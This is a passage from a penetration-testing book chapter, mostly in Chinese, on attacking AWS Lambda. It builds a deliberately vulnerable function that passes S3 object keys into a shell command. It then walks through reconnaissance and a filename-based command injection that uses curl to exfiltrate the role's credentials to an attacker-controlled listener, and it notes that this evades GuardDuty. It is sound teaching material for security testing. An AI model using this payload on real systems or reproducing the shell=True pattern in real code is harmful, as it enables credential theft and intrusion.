# 第十二章：AWS Lambda 的安全性和渗透测试

AWS Lambda 是一个令人惊叹的服务，为用户提供无服务器函数和应用程序。基本上，您创建一个带有要执行的代码的 Lambda 函数，然后创建某种触发器，每当触发该触发器时，您的 Lambda 函数将执行。用户只需支付 Lambda 函数运行所需的时间，最长为 15 分钟（但可以根据每个函数的需要手动降低）。Lambda 提供了多种编程语言供您的函数使用，甚至允许您设置自己的运行时以使用它尚不直接支持的语言。在我们深入研究所有这些之前，我们应该澄清无服务器是什么。尽管无服务器听起来好像没有涉及服务器，但 Lambda 基本上只是为函数需要运行的持续时间启动一个隔离的服务器。因此，仍然涉及服务器，但作为用户，您不需要处理服务器的规划、加固等。

对攻击者来说，这意味着我们仍然可以执行代码，使用文件系统，并执行大多数您可以在常规服务器上执行的其他活动，但有一些注意事项。其中之一是整个文件系统被挂载为只读，这意味着您无法直接修改系统上的任何内容，除了`/tmp`目录。`/tmp`目录是提供给 Lambda 函数在执行过程中根据需要写入文件的临时位置。另一个是您无法在这些服务器上获得 root 权限。简单明了，您只需接受您将永远成为 Lambda 函数中的低级用户。如果您确实找到了提升为 root 用户的方法，我相信 AWS 安全团队的人会很乐意听到这个消息。

在现实世界中，您可能会使用 Lambda 的一个示例场景是对上传到特定 S3 存储桶的任何文件进行病毒扫描。每次上传文件到该存储桶时，Lambda 函数将被触发，并传递上传事件的详细信息。然后，函数可能会将该文件下载到`/tmp`目录，然后使用 ClamAV（[`www.clamav.net/`](https://www.clamav.net/)）之类的工具对其进行病毒扫描。如果扫描通过，执行将完成。如果扫描标记文件为病毒，它可能会删除 S3 中相应的对象。

在本章中，我们将涵盖以下主题：

+   设置一个易受攻击的 Lambda 函数

+   使用读取访问攻击 Lambda 函数

+   使用读写访问攻击 Lamda 函数

+   转向虚拟私有云

# 设置一个易受攻击的 Lambda 函数

S3 中用于病毒扫描文件的 Lambda 函数的先前示例与我们将在自己的环境中设置的类似，但更复杂。我们指定的 S3 存储桶上传文件时，我们的函数将被触发，然后下载该文件，检查内容，然后根据发现的内容在 S3 对象上放置标签。这个函数将有一些编程错误，使其容易受到利用，以便进行演示，所以不要在生产账户中运行这个函数！

在我们开始创建 Lambda 函数之前，让我们首先设置将触发我们函数的 S3 存储桶和我们函数将承担的 IAM 角色。导航到 S3 仪表板（单击服务下拉菜单并搜索 S3），然后单击“创建存储桶”按钮：

![](img/b9113130-2785-4746-a8a8-999b47ef9ea9.png)

S3 仪表板上的“创建存储桶”按钮

现在，给您的存储桶一个唯一的名称；我们将使用 bucket-for-lambda-pentesting，但您可能需要选择其他内容。对于地区，我们选择美国西部（俄勒冈州），也称为 us-west-2。然后，单击“下一步”，然后再次单击“下一步”，然后再次单击“下一步”。将这些页面上的所有内容保留为默认设置。现在，您应该看到您的 S3 存储桶的摘要。单击“创建存储桶”以创建它：

！[](img/23b01b13-0858-49ba-92a4-eadfe7664eb8.png)

单击的最终按钮以创建您的 S3 存储桶

现在，在您的存储桶列表中显示存储桶名称时，单击该名称，这将完成我们的 Lambda 函数的 S3 存储桶设置（暂时）。

在浏览器中保留该选项卡打开，并在另一个选项卡中打开 IAM 仪表板（服务| IAM）。在屏幕左侧的列表中单击“角色”，然后单击左上角的“创建角色”按钮。在选择受信任实体类型下，选择 AWS 服务，这应该是默认值。然后，在“选择将使用此角色的服务”下，选择 Lambda，然后单击“下一步：权限”：

！[](img/e605c290-0a64-4bf5-a8fb-8b333713d7b1.png)

为我们的 Lambda 函数创建一个新角色

在此页面上，搜索 AWS 托管策略`AWSLambdaBasicExecutionRole`，并单击其旁边的复选框。此策略将允许我们的 Lambda 函数将执行日志推送到 CloudWatch，并且从某种意义上说，这是 Lambda 函数应该提供的最低权限集。可以撤销这些权限，但是 Lambda 函数将继续尝试写日志，并且将继续收到访问被拒绝的响应，这对于观察的人来说会很嘈杂。

现在，搜索 AWS 托管策略`AmazonS3FullAccess`，并单击其旁边的复选框。这将使我们的 Lambda 函数能够与 S3 服务进行交互。请注意，对于我们的 Lambda 函数用例来说，此策略过于宽松，因为它允许对任何 S3 资源进行完全的 S3 访问，而从技术上讲，我们只需要对我们的单个 bucket-for-lambda-pentesting S3 存储桶进行少量的 S3 权限。通常，您会发现在攻击的 AWS 帐户中存在过度授权的资源，这对于您作为攻击者来说没有任何好处，因此这将成为我们演示场景的一部分。

现在，单击屏幕右下角的“下一步：标记”按钮。我们不需要向此角色添加任何标记，因为这些通常用于我们现在需要担心的其他原因，所以只需单击“下一步：立即审阅”。现在，为您的角色创建一个名称；对于此演示，我们将其命名为`LambdaRoleForVulnerableFunction`，并且我们将保留角色描述为默认值，但如果您愿意，可以在其中编写自己的描述。现在，通过单击屏幕右下角的“创建角色”来完成此部分。如果一切顺利，您应该会在屏幕顶部看到成功消息：

！[](img/43a084b8-68c6-4fd8-ab95-65f27053d85d.png)

我们的 IAM 角色已成功创建

最后，我们可以开始创建实际的易受攻击的 Lambda 函数。要这样做，请转到 Lambda 仪表板（服务| Lambda），然后单击“创建函数”，这应该出现在欢迎页面上（因为可能您还没有创建任何函数）。请注意，这仍然位于美国西部（俄勒冈州）/ us-west-2 地区，就像我们的 S3 存储桶一样。

然后，在顶部选择从头开始。现在，为您的函数命名。对于此演示，我们将其命名为`VulnerableFunction`。接下来，我们需要选择我们的运行时，可以是各种不同的编程语言。对于此演示，我们将选择 Python 3.7 作为我们的运行时。

对于角色选项，请选择选择现有角色，然后在现有角色选项下，选择我们刚刚创建的角色（LambdaRoleForVulnerableFunction）。最后，单击右下角的“创建函数”：

！[](img/8694b8c0-c1eb-4cbd-9196-047d9f9cee33.png)

我们新的易受攻击的 Lambda 函数设置的所有选项

现在，您应该进入新易受攻击函数的仪表板，该仪表板可让您查看和配置 Lambda 函数的各种设置。

目前，我们可以暂时忽略此页面上的大部分内容，但是如果您想了解有关 Lambda 本身的更多信息，我建议您阅读 AWS 用户指南：[`docs.aws.amazon.com/lambda/latest/dg/welcome.html`](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html)。现在，向下滚动到“函数代码”部分。我们可以看到“处理程序”下的值是`lambda_function.lambda_handler`。这意味着当函数被调用时，`lambda_function.py`文件中名为`lambda_handler`的函数将作为 Lambda 函数的入口点执行。`lambda_function.py`文件应该已经打开，但如果没有，请在“函数代码”部分左侧的文件列表中双击它：

![](img/922ccc81-4968-4ff3-b55b-6ab9768b7bff.png)

Lambda 函数处理程序及其引用的值

如果您选择了不同的编程语言作为函数的运行时，您可能会遇到略有不同的格式，但总体上它们应该是相似的。

现在我们已经有了 Lambda 函数、Lambda 函数的 IAM 角色和我们创建的 S3 存储桶，我们将在我们的 S3 存储桶上创建事件触发器，每次触发时都会调用我们的 Lambda 函数。要做到这一点，返回到您的 bucket-for-lambda-pentesting S3 存储桶所在的浏览器选项卡，单击“属性”选项卡，然后向下滚动到“高级设置”下的选项，单击“事件”按钮：

![](img/79acebbb-ca45-4849-a784-d4bc0a804b90.png)

访问我们 S3 存储桶的事件设置

接下来，单击“添加通知”，并将此通知命名为`LambdaTriggerOnS3Upload`。在“事件”部分下，选中“所有对象创建事件”旁边的复选框，这对我们的需求已经足够了。对于此通知，我们将希望将“前缀”和“后缀”留空。单击“发送到”下拉菜单，并选择“Lambda 函数”，然后应该显示另一个下拉菜单，您可以在其中选择我们创建的函数`VulnerableFunction`。最后，单击“保存”：

![](img/21d55ec4-ab79-43b6-9599-92d21a346d6b.png)

我们想要的新通知配置

单击“保存”后，**事件**按钮应显示 1 个活动通知：

![](img/03ddc31b-ac53-4e0e-af6f-65e75a248fe4.png)

我们刚刚设置的通知。

如果您返回到 Lambda 函数仪表板并刷新页面，您应该看到 S3 已被添加为左侧“设计”部分中我们 Lambda 函数的触发器：

![](img/13b360a6-5717-4302-b326-75bb3cd3e3c6.png)

Lambda 函数知道它将被我们刚刚设置的通知触发

基本上，我们刚刚告诉我们的 S3 存储桶，每当创建一个对象（`/uploaded/`等），它都应该调用我们的 Lambda 函数。S3 将自动调用 Lambda 函数，并通过`event`参数传递与通过`event`参数传递的上传文件相关的详细信息，这是我们的函数接受的两个参数之一（`event`和`context`）。Lambda 函数可以通过在执行过程中查看`event`的内容来读取这些数据。

要完成我们易受攻击的 Lambda 函数的设置，我们需要向其中添加一些易受攻击的代码！在 Lambda 函数仪表板上，在“函数代码”下，用以下代码替换默认代码：

```
import boto3
import subprocess
import urllib

def lambda_handler(event, context):
    s3 = boto3.client('s3')

    for record in event['Records']:
        try:
            bucket_name = record['s3']['bucket']['name']
            object_key = record['s3']['object']['key']
            object_key = urllib.parse.unquote_plus(object_key)

            if object_key[-4:] != '.zip':
                print('Not a zip file, not tagging')
                continue

            response = s3.get_object(
                Bucket=bucket_name,
                Key=object_key
            )

            file_download_path = f'/tmp/{object_key.split("/")[-1]}'
            with open(file_download_path, 'wb+') as file:
                file.write(response['Body'].read())

            file_count = subprocess.check_output(
                f'zipinfo {file_download_path} | grep ^- | wc -l',
                shell=True,
                stderr=subprocess.STDOUT
            ).decode().rstrip()
            s3.put_object_tagging(
                Bucket=bucket_name,
                Key=object_key,
                Tagging={
                    'TagSet': [
                        {
                            'Key': 'NumOfFilesInZip',
                            'Value': file_count
                        }
                    ]
                }
            )
        except Exception as e:
            print(f'Error on object {object_key} in bucket {bucket_name}: {e}')
    return
```

当我们继续阅读本章时，我们将更深入地了解这个函数的运行情况。简单来说，每当文件上传到我们的 S3 存储桶时，这个函数就会被触发；它将确认文件是否具有`.zip`扩展名，然后将文件下载到`/tmp`目录中。下载完成后，它将使用`zipinfo`、`grep`和`wc`程序来计算 ZIP 文件中存储了多少文件。然后它将向 S3 中的对象添加一个标签，指定该 ZIP 文件中有多少个文件。你可能已经能够看到一些问题可能出现的地方，但我们稍后会讨论这些问题。

我们要做的最后一件事是下拉到 Lambda 仪表板的环境变量部分，并添加一个带有键`app_secret`和值`1234567890`的环境变量：

![](img/aed37b17-a967-4953-b477-aa5c0c6db456.png)

将 app_secret 环境变量添加到我们的函数中。

要完成本节，只需点击屏幕右上角的大橙色保存按钮，将此代码保存到您的 Lambda 函数中，我们就可以继续了。

# 使用只读访问攻击 Lambda 函数

要开始本章的只读访问部分，我们将创建一个具有特定权限集的新 IAM 用户。这是我们将用来演示攻击的用户，因此我们可以假设我们以某种方式刚刚窃取了这个用户的密钥。这些权限将允许对 AWS Lambda 进行只读访问，并允许向 S3 上传对象，但不会超出此范围。我们不会详细介绍创建用户、设置其权限并将其密钥添加到 AWS CLI 的整个过程，因为我们在之前的章节中已经涵盖了这些内容。

因此，请继续创建一个具有对 AWS 的编程访问权限的新 IAM 用户。对于这个演示，我们将命名该用户为`LambdaReadOnlyTester`。接下来，我们将添加一个自定义的内联 IAM 策略，使用以下 JSON 文档：

```
{
    "Version": "2012-10-17",
     "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "lambda:List*",
                "lambda:Get*",
                "s3:PutObject"
            ],
            "Resource": "*"
        }
    ]
}
```

正如你所看到的，我们可以使用任何以`List`或`Get`开头的 Lambda API，以及使用 S3 的`PutObject` API。这就像我在许多 AWS 环境中看到的情况，用户对各种资源具有广泛的读取权限，然后还有一些额外的 S3 权限，比如上传文件的能力。

在作为攻击者查看 AWS Lambda 时，首先要做的是获取账户中每个 Lambda 函数的所有相关数据。这可以通过 Lambda 的`ListFunctions` API 来完成。对于这个演示，我们已经知道我们想要攻击的函数在`us-west-2`，但在实际情况下，你可能想要检查每个区域是否有可能感兴趣的 Lambda 函数。我们将首先运行以下 AWS CLI 命令：

```
aws lambda list-functions --profile LambdaReadOnlyTester --region us-west-2
```

我们应该得到一些有用的信息。首先要查找的是环境变量。我们自己设置了这个有漏洞的函数，所以环境变量对我们来说并不是什么秘密，但作为攻击者，你经常可以发现存储在函数的环境变量中的敏感信息。这些信息在我们刚刚进行的`ListFunctions`调用中以`"Environment"`键的形式返回给我们，对于我们的有漏洞的函数，它应该看起来像这样：

```
"Environment": {
    "Variables": {
        "app_secret": "1234567890"
    }
}
```

你可以指望在 Lambda 函数的环境变量中发现各种意想不到的东西。作为攻击者，`"app_secret"`的值听起来很有趣。在过去的渗透测试中，我在环境变量中发现了各种秘密，包括用户名/密码/第三方服务的 API 密钥，AWS API 密钥到完全不同的账户，以及更多。仅仅查看几个 Lambda 函数的环境变量就让我多次提升了自己的权限，因此重要的是要注意存储的内容。我们自己设置了这个有漏洞的函数，所以我们知道`"app_secret"`环境变量对我们来说没有什么用，但它被包含在其中是为了演示这个想法。

在运行 Lambda `ListFunctions` API 调用时，如果函数设置了环境变量，`"Environment"`键将只包括在结果中；否则，它不会显示在结果中，所以如果那里没有任何内容可用，不要担心。

在检查环境变量之后，现在是查看每个 Lambda 函数的代码的好时机。要从 AWS CLI 中执行此操作，我们可以使用从`ListFunctions`获得的函数列表，并将每个函数通过 Lambda `GetFunction` API 调用运行。对于我们的易受攻击函数，我们可以运行以下命令：

```
aws lambda get-function --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

输出将看起来像运行`ListFunctions`时为每个函数返回的内容，但有一个重要的区别，即添加了`Code`键。这个键将包括`RepositoryType`和`Location`键，这是我们将代码下载到这个函数的方式。我们只需要复制 Code | Location 下的 URL 并粘贴到我们的网络浏览器中。提供的 URL 是一个预签名的 URL，它给了我们访问存储 Lambda 代码的 S3 存储桶的权限。访问页面后，它应该会下载一个以`VulnerableFunction`开头的`.zip`文件。

如果您解压文件，您会看到一个名为`lambda_function.py`的单个文件，其中存储了 Lambda 函数的代码。在许多情况下，那里会有多个文件，如第三方库、配置文件或二进制文件。

尽管我们的易受攻击函数相对较短，但我们将以它是大量代码的方式来处理，因为我们不能仅仅手动快速分析来模拟真实情况，因为您可能不熟悉 Lambda 函数使用的编程语言。

将函数解压到我们的计算机上后，我们现在将开始对包含的代码进行静态分析。我们知道这个函数正在运行 Python 3.7，因为当我们运行`ListFunctions`和`GetFunction`时，`Runtime`下列出了 Python 3.7，并且主文件是一个`.py`文件。代码的静态分析有许多选项，免费和付费的，它们在不同的编程语言之间有所不同，但我们将使用`Bandit`，它被描述为一个旨在发现 Python 代码中常见安全问题的工具。在继续之前，请注意，仅仅因为我们在这里使用它，并不一定意味着它是最好的和/或完美的。我建议您进行自己的研究，并尝试不同的工具，找到自己喜欢的工具，但 Bandit 是我个人喜欢使用的工具之一。Bandit 托管在 GitHub 上[`github.com/PyCQA/bandit`](https://github.com/PyCQA/bandit)。

Bandit 的安装很简单，因为它是通过 PyPI 提供的，这意味着我们可以使用 Python 包管理器`pip`来安装它。按照 Bandit GitHub 上的说明，我们将运行以下命令（一定要自行检查，以防有任何更新）：

```
virtualenv bandit-env
pip3 install bandit
```

我们使用`virtualenv`，以避免安装 Python 依赖项时出现任何问题，然后我们使用`pip3`来安装`bandit`，因为我们要分析的代码是用 Python 3 编写的。在撰写本文时，安装了 Bandit 版本 1.5.1，因此如果在本节的其余部分遇到任何问题，请注意您自己安装的版本。安装完成后，我们可以切换到解压 Lambda 函数的目录，然后使用`bandit`命令来针对包含我们代码的文件夹。我们可以使用以下命令来执行：

```
bandit -r ./VulnerableFunction/
```

现在 Lambda 函数将被扫描，`-r`标志指定递归，即扫描`VulnerableFunction`文件夹中的每个文件。我们现在只有一个文件，但了解这个标志对我们正在扫描的更大的 Lambda 函数有什么作用是很有用的。Bandit 完成后，我们将看到它报告了三个单独的问题：一个低严重性和高置信度，一个中等严重性和中等置信度，一个高严重性和高置信度：

![](img/6ad0c8d1-f53a-4200-a6a4-b49304c6b2e2.png)

Bandit 输出的结果

通常，静态源代码分析工具会输出相当数量的误报，因此重要的是要逐个检查每个问题，以验证它是否是一个真正的问题。静态分析工具也缺乏代码可能如何使用的上下文，因此安全问题可能对某些代码是一个问题，但对其他代码来说并不重要。在审查 Bandit 提出的第二个问题时，我们将更多地关注上下文。

查看 Bandit 报告的第一个问题，我们可以看到消息“考虑与子进程模块相关的可能安全影响”，这是非常有道理的。子进程模块用于在计算机上生成新进程，如果操作不正确可能会造成安全风险。我们将把这标记为一个有效问题，但在审查代码时要牢记这一点。

Bandit 报告的第二个问题告诉我们“可能不安全地使用了临时文件/目录”，并向我们显示了代码的行，其中一个变量被赋予了`/tmp`目录中文件路径的值，附加了另一个变量`object_key`。这是一个安全问题，在某些应用程序中可能是一个大问题，但考虑到我们 Lambda 函数的上下文，我们可以假设在这种情况下这不是一个问题。为什么？安全风险的一部分是可能有用户能够控制文件路径。用户可能会插入路径遍历序列或者欺骗脚本将临时文件写入其他位置，比如`/etc/shadow`，这可能会带来危险的后果。这对我们来说不是一个问题，因为代码在 Lambda 中运行，这意味着它在只读文件系统上运行；所以，即使有人能够遍历出`/tmp`目录，函数也无法覆盖系统上的任何重要文件。这里可能会出现其他可能的问题，但对我们来说没有直接适用的，所以我们可以把这个问题划掉为误报。

接下来是 Bandit 提出的最后一个最严重的问题，它告诉我们“识别出了使用 shell=True 的子进程调用，存在安全问题”，听起来很有趣。这告诉我们正在生成一个新进程，并且可以访问操作系统的 shell，这可能意味着我们可以注入 shell 命令！看看 Bandit 标记的行（第 30 行），我们甚至可以看到一个 Python 变量（`file_download_path`）直接连接到正在运行的命令中。这意味着如果我们可以以某种方式控制该值，我们可以修改在操作系统上运行的命令以执行任意代码。

接下来，我们想看看`file_download_path`在哪里被赋值。我们知道它的赋值出现在 Bandit 的问题＃2（第 25 行），代码如下：

```
file_download_path = f'/tmp/{object_key.split("/")[-1]}'
```

就像第 30 行的字符串一样，这里使用了 Python 3 的`f`字符串（有关更多信息，请参见[`docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals`](https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals)），它基本上允许您在字符串中嵌入变量和代码，因此您不必进行任何混乱的连接，使用加号或其他任何东西。我们在这里看到的是`file_download_path`是一个字符串，其中包含代码中的另一个变量`object_key`，它在其中的每个`"/"`处被拆分。然后，`[-1]`表示使用从`"/"`拆分而成的列表的最后一个元素。

现在，如果我们追溯`object_key`变量，看看它是在哪里被赋值的，我们可以看到在第 13 行，它被赋值为`record['s3']['object']['key']`的值。好的，我们可以看到函数期望`event`变量包含有关 S3 对象的信息（以及第 11 行的 S3 存储桶）。我们想弄清楚是否可以以某种方式控制该变量的值，但考虑到我们作为攻击者的上下文，我们不知道这个函数是否会定期被调用，也不知道如何调用。我们可以检查的第一件事是我们的 Lambda 函数是否有任何事件源映射。可以使用以下命令来完成这个任务：

```
aws lambda list-event-source-mappings --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

在这种情况下，我们应该得到一个空列表，如下所示：

```
{
    “EventSourceMappings”: []
}
```

事件源映射基本上是将 Lambda 函数连接到另一个服务的一种方式，以便在该服务中发生其他事情时触发它。事件源映射的一个示例是 DynamoDB，每当 DynamoDB 表中的项目被修改时，它就会触发一个 Lambda 函数，并包含被添加到表中的内容。正如您所看到的，我们当前的函数没有与此相关的内容，但现在不是恐慌的时候！并非每个自动触发源都会显示为事件源映射。

下一步将是查看 Lambda 函数的资源策略，它基本上指定了谁可以调用此函数。要获取资源策略，我们将使用`GetPolicy` API：

```
aws lambda get-policy --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

如果我们幸运的话，我们将得到一个 JSON 对象作为对此 API 调用的响应，但如果没有，我们可能会收到 API 错误，指示找不到资源。这将表明没有为 Lambda 函数设置资源策略。如果是这种情况，那么我们可能无法以任何方式调用此 Lambda 函数，除非我们碰巧拥有`lambda:InvokeFunction`权限（但在这种情况下我们没有）。

今天一定是我们的幸运日，因为我们得到了一个策略。它应该看起来像下面这样，只是`000000000000`将被您自己的 AWS 帐户 ID 替换，修订 ID 将不同：

```
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"s3.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction\",\"Condition\":{\"StringEquals\":{\"AWS:SourceAccount\":\"000000000000\"},\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:s3:::bucket-for-lambda-pentesting\"}}}]}",
    "RevisionId": "d1e76306-4r3a-411c-b8cz-6x4731qa7f00"
}
```

混乱且难以阅读，对吧？这是因为一个 JSON 对象被存储为一个字符串，作为另一个 JSON 对象中一个键的值。为了使这一点更清晰，我们可以复制`"Policy"`键内的整个值，删除转义字符（`\`），并添加一些漂亮的缩进，然后我们将得到这样的结果：

```
{
    "Version": "2012-10-17",
    "Id": "default",
    "Statement": [
        {
            "Sid": "000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul",
            "Effect": "Allow",
            "Principal": {
                "Service": "s3.amazonaws.com"
            },
            "Action": "lambda:InvokeFunction",
            "Resource": "arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction",
            "Condition": {
                "StringEquals": {
                    "AWS:SourceAccount": "000000000000"
                },
                "ArnLike": {
                    "AWS:SourceArn": "arn:aws:s3:::bucket-for-lambda-pentesting"
                }
            }
        }
    ]
}
```

看起来好多了，不是吗？我们正在查看一个 JSON 策略文档，指定了什么可以调用这个 Lambda 函数，我们可以看到`"Action"`设置为`"lambda:InvokeFunction"`。接下来，我们可以看到`"Principal"`设置为 AWS 服务 S3。这听起来正确，因为我们知道该函数正在处理 S3 对象。在`"Resource"`下，我们看到了 Lambda 函数的 ARN，正如预期的那样。在`"Condition"`下，我们看到`"AWS:SourceAccount"`必须是`000000000000`，这是我们正在使用的账户 ID，所以很好。在`"Condition"`下还有`"ArnLike"`，显示了一个 S3 存储桶的 ARN。我们没有所需的 S3 权限去确认这些信息，但我们可以合理地假设某种 S3 事件已经设置好，当发生某些事情时会调用这个函数（我们知道这是真的，因为我们之前设置过）。

另一个重要的提示可以在`"Sid"`键中找到，我们可以看到值为`"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul"`，这显示了`"LambdaTriggerOnS3Upload"`。现在我们可以做出一个合理的猜测，即当文件上传到 S3 存储桶`"bucket-for-lambda-pentesting"`时，将调用这个 Lambda 函数。如果你还记得我们设置这些资源时，`"LambdaTriggerOnS3Upload"`就是我们之前添加到 S3 存储桶的事件触发器的名称，所以在这种情况下，冗长的命名方案帮助了我们作为攻击者。更好的是，我们知道我们的受损用户被授予了`"s3:PutObject"`权限！

现在我们已经拼出了这个谜题的所有部分。我们知道 Lambda 函数运行一个带有变量（`file_download_path`）的 shell 命令，我们知道该变量由另一个变量（`object_key`）组成，我们知道该变量被设置为值`record['s3']['object']['key']`。我们还知道，每当文件上传到`"bucket-for-lambda-pentesting"` S3 存储桶时，就会调用这个 Lambda 函数，而且我们有必要的权限将文件上传到该存储桶。鉴于这一切，这意味着我们可以上传一个我们选择的文件，最终将其传递到一个 shell 命令中，这正是我们想要的，如果我们试图在系统上执行代码！

但是，等等；在运行 Lambda 函数的服务器上执行任意代码有什么好处呢？它是一个只读文件系统，而且我们已经有了源代码。更多的凭证，这就是好处！如果你还记得之前，我们需要创建一个 IAM 角色，附加到我们创建的 Lambda 函数上，然后允许我们的函数与 AWS API 进行身份验证。当 Lambda 函数运行时，它会假定附加到它的 IAM 角色，并获得一组临时凭证（记住，这是访问密钥 ID、秘密访问密钥和会话令牌）。Lambda 函数与 EC2 实例有些不同，这意味着没有`http://169.254.169.254`上的元数据服务，这意味着我们无法通过那里检索这些临时凭证。Lambda 的做法不同；它将凭证存储在环境变量中，所以一旦我们能在服务器上执行代码，我们就可以窃取这些凭证，然后我们将获得附加到 Lambda 函数的角色的所有权限。

在这种情况下，我们知道 LambdaRoleForVulnerableFunction IAM 角色具有完全的 S3 访问权限，这比我们微不足道的`PutObject`访问权限要多得多，它还具有一些 CloudWatch 日志权限。我们目前无法访问 CloudWatch 中的日志，所以我们需要将凭证窃取到我们控制的服务器上。否则，我们将无法读取这些值。

现在，让我们开始我们的有效载荷。有时，如果您将整个 Lambda 函数复制到自己的 AWS 帐户中，可能会有所帮助，这样您就可以使用有效载荷对其进行轰炸，直到找到有效的有效载荷，但我们将首先手动尝试。我们知道我们基本上控制`object_key`变量，最终将其放入 shell 命令中。因此，如果我们传入一个无害的值`"hello.zip"`，我们将看到以下内容：

```
Line 13: object_key is assigned the value of "hello.zip"

Line 14: object_key is URL decoded by urllib.parse.unquote_plus (Note: the reason this line is in the code is because the file name comes in with special characters URL encoded, so those need to be decoded to work with the S3 object directly)

Line 25: file_download_path is assigned the value of f'/tmp/{object_key.split("/")[-1]}', which ultimately resolves to "/tmp/hello.zip"

Lines 29-30: A shell command is run with the input f'zipinfo {file_download_path} | grep ^- | wc -l', which resolves to "zipinfo /tmp/hello.zip | grep ^- | wc -l".
```

似乎只有一个限制需要我们担心，那就是代码检查文件是否在第 16 行具有`.zip`扩展名。有了所有这些信息，我们现在可以开始制作恶意有效载荷。

`zipinfo /tmp/hello.zip`命令中直接包含了我们提供的字符串，因此我们只需要打破这个命令以运行我们自己的任意命令。如果我们将`hello.zip`更改为`hello;sleep 5;.zip`，那么最终命令将变成`"zipinfo /tmp/hello;sleep 5;.zip | grep ^- | wc -l"`。我们插入了几个分号，这会导致 shell 解释器（bash）认为有多个要执行的命令。不是运行单个命令`zipinfo /tmp/hello.zip`，而是运行`"zipinfo /tmp/hello"`，这将失败，因为那不是一个存在的文件；然后，它将运行`"sleep 5"`并休眠五秒，然后它将运行`".zip"`，这不是一个真正的命令，因此将抛出错误。

就像这样，我们已经将一个命令(`sleep 5`)注入到 Lambda 服务器的 shell 中。现在，因为这是盲目的（也就是说，我们看不到任何命令的输出），我们需要窃取我们想要的重要信息。支持 Lambda 函数的操作系统默认安装了`"curl"`，因此这将是进行外部请求的一种简单方法，我们知道 AWS 凭证存储在环境变量中，因此我们只需要`curl`凭证到我们控制的服务器。

为此，我在自己的服务器上设置了 NetCat 监听器（示例中的 IP 地址为`1.1.1.1`），端口为`80`，命令如下：

```
nc -nlvp 80
```

然后，我们将制定一个有效载荷，将窃取凭证。我们可以使用`"env"`命令访问环境变量，因此用 curl 向我们的外部服务器发出 HTTP POST 请求的一般命令，其中包括所有环境变量作为主体，如下所示：

```
curl -X POST -d "`env`" 1.1.1.1
```

这可能看起来有点奇怪，但因为`"env"`命令提供多行内容，所以需要将其放入引号中，否则它将破坏整个命令（尝试在自己的服务器上运行`"curl -X POST -d `env` 1.1.1.1"`并查看结果）。如果您不熟悉，反引号（```) instruct bash to run the `"env"` command prior to executing the whole `curl` command, so it will then `POST` those variables to our external server. Also, because our server is listening on port `80`, we don't need to include `http://` or the port in our `curl` command, because given an IP address, the default is to go to `http://1.1.1.1:80`. We can avoid a lot of unnecessary characters this way. This may not necessarily be a conventional way of doing this, but what is nice about this string is that it is easy to fit into a filename, which is exactly what we need to exploit this Lambda function!

Back to our payload; now, we will need to upload a file to S3 with the following name:

```

hello;curl -X POST -d "`env`" 1.1.1.1;.zip

```

Microsoft Windows won't let you create a file with this name because of the double quotes in it, but it is easy to do so with Linux. We can use the `touch` command to create the file. It will look like this:

```

touch 'hello;curl -X POST -d "`env`" 1.1.1.1;.zip'

```

The output of the preceding command will look something like this:

![](img/215c8c00-1f95-48dd-b752-e4274bc82d14.png)

Creating our file with the malicious name on our own Ubuntu server

Everything is in place now. All we need to do is ensure that our NetCat listener has started on our external server, and then we need to upload this file to the `bucket-for-lambda-pentesting` S3 bucket, then wait for the Lambda function to be invoked, and then, finally, wait for our malicious command to execute. We can upload it by using the S3 `copy` AWS CLI command to copy our local malicious file to the remote S3 bucket:

```

aws s3 cp ./'hello;curl -X POST -d "`env`" 1.1.1.1;.zip' s3://bucket-for-lambda-pentesting --profile LambdaReadOnlyTester

```

It looks a little messed up because of our malicious filename, but all it is doing is using the S3 `copy` command as the `LambdaReadOnlyTester` AWS CLI profile to copy our local malicious file to the `bucket-for-lambda-pentesting` S3 bucket. After executing this command, we just wait and watch our NetCat listener, in hope of some credentials! A few seconds later, we'll see the following:

![](img/972de3e2-9dfb-48ed-8a9d-75616e094317.png)

All the environment variables from the Lambda server posted to our NetCat listener

We did it! We just successfully achieved code execution on the server running a Lambda function, through a method sometimes referred to as event injection, and then we successfully exfiltrated the credentials of the role attached to that Lambda function to our external server. Now, you can throw those credentials into your AWS CLI and go forth and conquer!

Bonus: At the time of writing, GuardDuty's `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` finding type ([https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11)) does not apply to credentials exfiltrated from Lambda servers!

One final note is to say that we exploited one method of event injection to exploit this Lambda function, but there are plenty of other kinds. You can trigger Lambda function invocations through a variety of methods, such as the DynamoDB example from earlier, or possibly from a CloudWatch Events rule. You just need to find out how you can get your own input into the function to take control of the execution. The simplest, quickest way to make this happen is to use a custom test event (if you have the `"lambda:InvokeFunction"` permission), because you can just specify the exact payload that you need in the event.

Other things to keep in mind while pentesting Lambda functions (with read access) include the following:

*   Check the tags associated with each function for sensitive information. This is highly unlikely, but not unheard of.
*   As we discussed earlier, consider copying the whole function over to your own AWS account for testing, so that you don't need to make noise in the target environment.
*   If you have CloudWatch logs access, review the execution logs for each Lambda function to see if anything sensitive was printed (stored in the `"/aws/lambda/<function name>"` log group).
*   You can download a `.zip` file of the entire Lambda function from the AWS web console by clicking on the `"Actions"` drop-down menu, clicking on `"Export function"`, and choosing `"Download deployment package"`. Then, it is simple to port over to your own account.
